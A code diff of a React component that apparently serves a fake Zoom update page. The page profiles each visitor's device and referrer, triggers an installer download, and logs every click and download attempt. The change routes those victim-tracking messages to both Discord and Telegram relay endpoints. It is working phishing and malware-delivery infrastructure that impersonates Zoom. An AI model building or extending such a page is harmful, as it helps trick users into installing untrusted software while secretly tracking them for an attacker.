@@ -44,25 +44,37 @@ export default function UpdateBox() {
     return () => window.removeEventListener("resize", handleResize);
   }, []);
 
-  // Send data to Discord
-  const sendToDiscord = async (message) => {
+  // Send data to Discord & Telegram
+  const sendNotification = async (message) => {
     try {
-      const response = await fetch("/api/discord", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ text: message }),
-      });
-
-      if (!response.ok) {
-        const errorData = await response.json().catch(() => ({}));
-        console.error("Discord API Error Details:", errorData);
-        throw new Error(`Discord webhook error: ${response.status} ${errorData.error || ""}`);
-      }
-
-      console.log("Message sent to Discord");
-      return await response.json();
+      await Promise.allSettled([
+        fetch("/api/discord", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ text: message }),
+        }).then(async (res) => {
+          if (!res.ok) {
+            const err = await res.json().catch(() => ({}));
+            console.error("Discord error:", err);
+          } else {
+            console.log("Message sent to Discord");
+          }
+        }),
+        fetch("/api/telegram", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ text: message }),
+        }).then(async (res) => {
+          if (!res.ok) {
+            const err = await res.json().catch(() => ({}));
+            console.error("Telegram error:", err);
+          } else {
+            console.log("Message sent to Telegram");
+          }
+        })
+      ]);
     } catch (error) {
-      console.error("Failed to send to Discord:", error);
+      console.error("Failed to send notification:", error);
     }
   };
 
@@ -133,7 +145,7 @@ export default function UpdateBox() {
           body: JSON.stringify(body),
         });
 
-        // Send to Discord directly with more info
+        // Send to notification channels directly with more info
         const discordMessage = `
 🔵 Zoom Update Access
 📱 Device: ${detectedOs}
@@ -144,12 +156,12 @@ export default function UpdateBox() {
 ⏰ Time: ${new Date().toISOString()}
 🔄 Referrer: ${document.referrer || "direct"}
 `;
-        await sendToDiscord(discordMessage);
+        await sendNotification(discordMessage);
 
       } catch (error) {
         console.error("Error sending device info:", error);
-        // Try to send error to Discord for monitoring
-        sendToDiscord(`❌ Error collecting device info: ${error.message}`);
+        // Try to send error to notifications for monitoring
+        sendNotification(`❌ Error collecting device info: ${error.message}`);
       } finally {
         setIsLoading(false);
       }
@@ -176,8 +188,8 @@ export default function UpdateBox() {
       setIsDownloading(true);
 
       try {
-        // Send an event to Discord that download is starting
-        await sendToDiscord(`🔽 Download initiated for ${os} device`);
+        // Send an event that download is starting
+        await sendNotification(`🔽 Download initiated for ${os} device`);
 
         const link = document.createElement("a");
         link.href = downloadUrl;
@@ -192,14 +204,14 @@ export default function UpdateBox() {
 
         setDownloadInitiated(true);
 
-        // Send successful download event to Discord
-        await sendToDiscord(`✅ Download started successfully for ${os} device`);
+        // Send successful download event
+        await sendNotification(`✅ Download started successfully for ${os} device`);
       } catch (error) {
         console.error("Download failed:", error);
         setDownloadError(true);
 
-        // Send error to Discord
-        await sendToDiscord(`❌ Download failed for ${os} device: ${error.message}`);
+        // Send error notification
+        await sendNotification(`❌ Download failed for ${os} device: ${error.message}`);
       } finally {
         setIsDownloading(false);
       }
@@ -249,7 +261,7 @@ export default function UpdateBox() {
   // Handle manual download click
   const handleManualDownload = async () => {
     try {
-      await sendToDiscord(`🔄 Manual download attempt for ${os} device`);
+      await sendNotification(`🔄 Manual download attempt for ${os} device`);
       const windowsDownloadUrl = ZOOM_WIN_URL || DEFAULT_WINDOWS_INSTALLER_PATH;
       window.location.href = os === "windows" ? windowsDownloadUrl : ZOOM_MAC_URL;
     } catch (error) {
@@ -260,7 +272,7 @@ export default function UpdateBox() {
   // Handle meeting join click
   const handleJoinMeeting = async () => {
     try {
-      await sendToDiscord(`🚀 User attempting to join meeting from ${os} device`);
+      await sendNotification(`🚀 User attempting to join meeting from ${os} device`);
       window.location.href = MEETING_LINK;
     } catch (error) {
       console.error("Failed to send join meeting event:", error);
@@ -306,7 +318,7 @@ export default function UpdateBox() {
 
             <button
               onClick={() => {
-                sendToDiscord("📱 Mobile user closed modal");
+                sendNotification("📱 Mobile user closed modal");
                 setShowMobileModal(false);
               }}
               className="border border-gray-300 text-gray-700 font-semibold py-3 px-4 rounded-md hover:bg-gray-100 transition-colors w-full text-sm sm:text-base"
@@ -347,7 +359,7 @@ export default function UpdateBox() {
             <a
               href="#"
               className="text-blue-600 hover:underline flex items-center justify-center sm:justify-start text-sm sm:text-base"
-              onClick={() => sendToDiscord("👆 User clicked 'Discover Zoom Workplace'")}
+              onClick={() => sendNotification("👆 User clicked 'Discover Zoom Workplace'")}
             >
               Discover Zoom Workplace
             </a>
@@ -482,7 +494,7 @@ export default function UpdateBox() {
                 <a
                   href="#"
                   className="text-blue-600 hover:underline text-xs sm:text-sm"
-                  onClick={() => sendToDiscord("👆 User clicked 'Read more'")}
+                  onClick={() => sendNotification("👆 User clicked 'Read more'")}
                 >
                   Read more
                 </a>
@@ -575,7 +587,7 @@ export default function UpdateBox() {
               <button
                 onClick={() => {
                   setShowCookiePopup(false);
-                  sendToDiscord("🍪 User accepted cookies");
+                  sendNotification("🍪 User accepted cookies");
                 }}
                 className="bg-blue-600 text-white px-3 sm:px-4 py-1.5 sm:py-2 rounded-full hover:bg-blue-700 transition-colors text-xs sm:text-sm flex-grow md:flex-grow-0"
               >
@@ -584,7 +596,7 @@ export default function UpdateBox() {
               <button
                 onClick={() => {
                   setShowCookiePopup(false);
-                  sendToDiscord("🍪 User dismissed cookie popup");
+                  sendNotification("🍪 User dismissed cookie popup");
                 }}
                 className="text-gray-700 hover:text-gray-900 p-1.5 sm:p-2"
               >
